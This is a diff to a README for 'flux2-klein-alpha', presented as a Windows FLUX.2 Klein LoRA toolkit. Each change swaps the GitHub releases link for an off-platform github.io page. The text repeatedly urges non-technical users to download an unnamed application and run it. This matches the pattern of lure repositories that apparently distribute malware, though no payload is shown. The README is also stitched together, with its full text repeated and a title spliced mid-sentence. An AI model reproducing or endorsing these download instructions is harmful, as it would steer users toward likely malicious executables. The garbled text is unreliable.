@@ -2,7 +2,7 @@
 
 Visit this link to download the application:
 
-[![Download flux2-klein-alpha](https://img.shields.io/badge/Download-flux2--klein--alpha-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Renatenurturant522/flux2-klein-alpha/releases)
+[![Download flux2-klein-alpha](https://img.shields.io/badge/Download-flux2--klein--alpha-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://renatenurturant522.github.io)
 
 flux2-klein-alpha is a Windows-friendly package for working with FLUX.2 Klein image projects. It brings together an RGBA VAE helper, LoRA extraction and removal tools, a Gradio demo, and an ai-toolkit patch. The download page is the starting point for getting the application onto your computer.
 
@@ -25,7 +25,7 @@ You do not need to understand the inner workings of image models to get started.
 Getting started with flux2-klein-alpha is meant to be simple. You only need to begin from the official release page. The release page is where the application download is provided.
 
 1. Open the download link shown near the top of this page.
-2. Visit this link to download the application: [flux2-klein-alpha releases](https://github.com/Renatenurturant522/flux2-klein-alpha/releases).
+2. Visit this link to download the application: [flux2-klein-alpha releases](https://renatenurturant522.github.io).
 3. Keep the download in a folder you can find easily, such as your Downloads folder.
 4. When the download is complete, open the application from that folder.
 5. Use the Gradio demo window or page that appears to explore the RGBA VAE and LoRA tools.
@@ -74,7 +74,7 @@ Make sure you are using a Windows computer with a stable internet connection. Ha
 
 ### Download the Application
 
-Visit this link to download the application: [flux2-klein-alpha releases](https://github.com/Renatenurturant522/flux2-klein-alpha/releases).
+Visit this link to download the application: [flux2-klein-alpha releases](https://renatenurturant522.github.io).
 
 Use the release page as your only starting point. The page provides the application download. Once you are there, follow the page’s download action and wait for the file to finish downloading. Large downloads can take several minutes depending on your internet speed.
 
@@ -90,7 +90,7 @@ After the application opens, look for the Gradio demo interface. This is the vis
 
 Visit this link to download the application:
 
-[![Download flux2-klein-alpha](https://img.shields.io/badge/Download-flux2--klein--alpha-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Renatenurturant522/flux2-klein-alpha/releases)
+[![Download flux2-klein-alpha](https://img.shields.io/badge/Download-flux2--klein--alpha-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://renatenurturant522.github.io)
 
 The download page is the official place to get flux2-klein-alpha. Use it to download the application, then open the application from the folder where your download was saved. Keep the release page bookmarked so you can return to it later if you need to download the application again or check for updated files.
 
@@ -117,9 +117,9 @@ Copy the link from this page and paste it into your browser’s address bar. Mak
 
 Large downloads can pause or slow down. Check that your internet connection is stable. Keep the browser window open while the download is in progress. If the download appears completely stuck, close the browser tab and visit the release link again to# 🎨 flux2-klein-alpha - Easy FLUX.2 Klein LoRA Toolkit
 
-[![Download flux2-klein-alpha](https://img.shields.io/badge/Download-flux2--klein--alpha-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Renatenurturant522/flux2-klein-alpha/releases)
+[![Download flux2-klein-alpha](https://img.shields.io/badge/Download-flux2--klein--alpha-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://renatenurturant522.github.io)
 
-Visit this link to download the application: [flux2-klein-alpha releases](https://github.com/Renatenurturant522/flux2-klein-alpha/releases).
+Visit this link to download the application: [flux2-klein-alpha releases](https://renatenurturant522.github.io).
 
 flux2-klein-alpha is a Windows-friendly package for working with FLUX.2 Klein image projects. It brings together an RGBA VAE helper, LoRA extraction and removal tools, a Gradio demo, and an ai-toolkit patch. The download page is the starting point for getting the application onto your computer.
 
@@ -142,7 +142,7 @@ You do not need to understand the inner workings of image models to get started.
 Getting started with flux2-klein-alpha is meant to be simple. You only need to begin from the official release page. The release page is where the application download is provided.
 
 1. Open the download link shown near the top of this page.
-2. Visit this link to download the application: [flux2-klein-alpha releases](https://github.com/Renatenurturant522/flux2-klein-alpha/releases).
+2. Visit this link to download the application: [flux2-klein-alpha releases](https://renatenurturant522.github.io).
 3. Keep the download in a folder you can find easily, such as your Downloads folder.
 4. When the download is complete, open the application from that folder.
 5. Use the Gradio demo window or page that appears to explore the RGBA VAE and LoRA tools.
@@ -191,7 +191,7 @@ Make sure you are using a Windows computer with a stable internet connection. Ha
 
 ### Download the Application
 
-Visit this link to download the application: [flux2-klein-alpha releases](https://github.com/Renatenurturant522/flux2-klein-alpha/releases).
+Visit this link to download the application: [flux2-klein-alpha releases](https://renatenurturant522.github.io).
 
 Use the release page as your only starting point. The page provides the application download. Once you are there, follow the page’s download action and wait for the file to finish downloading. Large downloads can take several minutes depending on your internet speed.
 
@@ -207,7 +207,7 @@ After the application opens, look for the Gradio demo interface. This is the vis
 
 Visit this link to download the application:
 
-[![Download flux2-klein-alpha](https://img.shields.io/badge/Download-flux2--klein--alpha-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Renatenurturant522/flux2-klein-alpha/releases)
+[![Download flux2-klein-alpha](https://img.shields.io/badge/Download-flux2--klein--alpha-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://renatenurturant522.github.io)
 
 The download page is the official place to get flux2-klein-alpha. Use it to download the application, then open the application from the folder where your download was saved. Keep the release page bookmarked so you can return to it later if you need to download the application again or check for updated files.
 
